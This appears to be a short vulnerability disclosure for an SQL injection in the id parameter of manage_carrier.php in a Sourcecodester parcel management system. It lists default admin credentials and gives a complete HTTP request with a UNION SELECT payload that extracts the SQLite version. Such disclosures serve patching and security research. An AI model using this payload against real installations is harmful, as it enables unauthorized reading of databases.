# Simple Logistic Hub Parcel's Management System v1.0 by Sourcecodester has SQL injection 2

BUG_Author: Liu Lanling

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15051/simple-logistic-hub-parcels-management-system-php-and-sqlite-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /lhpms/manage_carrier.php

Vulnerability location: /lhpms/manage_carrier.php?id=, id

[+] Payload:  // Leak place ---> id

```sql
GET /lhpms/manage_carrier.php?id=1%27%20union%20select%201,2,sqlite_version(),4,5,6--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=aql25isdr8lel085k89oteptif
Connection: close


```
<img width="900" height="467" alt="image" src="https://github.com/user-attachments/assets/2c431ccb-d93b-4bf7-8db3-e8cb5abd88f1" />
